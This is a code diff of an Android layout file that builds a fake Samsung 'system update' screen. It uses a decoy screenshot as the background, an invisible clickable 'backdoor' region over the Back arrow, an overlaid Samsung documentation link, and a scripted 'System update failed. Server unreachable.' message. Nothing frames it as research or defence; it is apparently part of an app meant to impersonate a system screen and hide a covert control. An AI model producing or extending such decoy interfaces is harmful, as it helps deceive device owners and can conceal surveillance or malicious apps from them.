@@ -6,68 +6,88 @@
     android:layout_height="match_parent"
     android:background="#000000">
 
-    <!-- High-Fidelity Decoy Base (Screenshot 1: Install screen) -->
-
-    <!-- GHOST_BACKDOOR: Positioned over the 'Back' arrow area (Top-Left) -->
+    <!-- Fixed Back Button / Backdoor (Top-Left) -->
     <View
         android:id="@+id/ivUpdateIcon"
-        android:layout_width="72dp"
-        android:layout_height="72dp"
+        android:layout_width="104dp"
+        android:layout_height="86dp"
+        android:layout_marginStart="4dp"
+        android:layout_marginTop="16dp"
         android:background="@android:color/transparent"
         android:clickable="true"
         android:focusable="true"
-        app:layout_constraintStart_toStartOf="parent"
-        app:layout_constraintTop_toTopOf="parent" />
-
-    <!-- Button Container for Realistic Loading -->
-
-    <!-- Clickable overlay for the Samsung Learn More URL -->
-
-    <ImageView
-        android:id="@+id/ivDecoyBase"
-        android:layout_width="match_parent"
-        android:layout_height="0dp"
-        android:adjustViewBounds="true"
-        android:foregroundTint="#2196F3"
-        android:scaleType="fitCenter"
-        android:src="@drawable/update1"
-        app:layout_constraintBottom_toTopOf="@+id/buttonContainer"
-        app:layout_constraintEnd_toEndOf="parent"
-        app:layout_constraintHorizontal_bias="0.0"
+        android:visibility="visible"
+        android:elevation="20dp"
         app:layout_constraintStart_toStartOf="parent"
         app:layout_constraintTop_toTopOf="parent"
-        app:layout_constraintVertical_bias="0.0" />
+        tools:ignore="MissingConstraints"
+        tools:visibility="invisible" />
 
-    <View
-        android:id="@+id/btnLearnMore"
-        android:layout_width="339dp"
-        android:layout_height="49dp"
-        android:layout_marginBottom="128dp"
-        android:background="@android:color/transparent"
-        android:backgroundTint="#2196F3"
-        android:clickable="true"
-        android:focusable="true"
-        app:layout_constraintBottom_toTopOf="@+id/buttonContainer"
-        app:layout_constraintEnd_toEndOf="parent"
-        app:layout_constraintStart_toStartOf="parent" />
+    <!-- Scrollable Content -->
+    <ScrollView
+        android:id="@+id/updateScrollView"
+        android:layout_width="match_parent"
+        android:layout_height="0dp"
+        android:fillViewport="true"
+        app:layout_constraintBottom_toTopOf="@id/buttonContainer"
+        app:layout_constraintTop_toTopOf="parent">
 
+        <androidx.constraintlayout.widget.ConstraintLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content">
+
+            <ImageView
+                android:id="@+id/ivDecoyBase"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:adjustViewBounds="true"
+                android:scaleType="fitCenter"
+                android:src="@drawable/update1"
+                app:layout_constraintEnd_toEndOf="parent"
+                app:layout_constraintStart_toStartOf="parent"
+                app:layout_constraintTop_toTopOf="parent" />
+
+            <TextView
+                android:id="@+id/btnLearnMore"
+                android:layout_width="1000dp"
+                android:layout_height="37dp"
+                android:background="#141818"
+                android:clickable="true"
+                android:elevation="10dp"
+                android:focusable="true"
+                android:fontFamily="sans-serif"
+                android:gravity="start|center_vertical"
+                android:paddingStart="24dp"
+                android:paddingTop="4dp"
+                android:paddingEnd="20dp"
+                android:paddingBottom="4dp"
+                android:textColor="#3470E5"
+                android:textSize="13sp"
+                app:layout_constraintBottom_toBottomOf="@id/ivDecoyBase"
+                app:layout_constraintStart_toStartOf="parent"
+                app:layout_constraintTop_toTopOf="@id/ivDecoyBase"
+                app:layout_constraintVertical_bias="0.782"
+                tools:text="https://doc.samsungmobile.com/SM-F731W/CHR/doc.html" />
+
+            <!-- Learn More link: Overlaid on the blue URL in the background image -->
+
+        </androidx.constraintlayout.widget.ConstraintLayout>
+    </ScrollView>
+
+    <!-- Fixed Action Button at Bottom -->
     <FrameLayout
         android:id="@+id/buttonContainer"
-        android:layout_width="217dp"
-        android:layout_height="70dp"
-        android:layout_marginHorizontal="24dp"
-        android:layout_marginBottom="16dp"
-        app:layout_constraintBottom_toBottomOf="parent"
-        app:layout_constraintEnd_toEndOf="parent"
-        app:layout_constraintStart_toStartOf="parent">
-
-        <!-- High-Fidelity Spinning Four-Dot Loading Effect -->
+        android:layout_width="match_parent"
+        android:layout_height="100dp"
+        android:background="#141818"
+        android:elevation="15dp"
+        app:layout_constraintBottom_toBottomOf="parent">
 
         <com.google.android.material.button.MaterialButton
             android:id="@+id/btnCheckUpdate"
-            android:layout_width="match_parent"
+            android:layout_width="217dp"
             android:layout_height="59dp"
-            android:layout_marginTop="5dp"
+            android:layout_gravity="center"
             android:backgroundTint="#3574EE"
             android:fontFamily="@font/assistant"
             android:letterSpacing="0.028"
@@ -142,6 +162,7 @@
             android:text="System update failed. Server unreachable."
             android:textColor="#FFFFFF"
             android:textSize="14sp" />
+
     </LinearLayout>
 
 </androidx.constraintlayout.widget.ConstraintLayout>
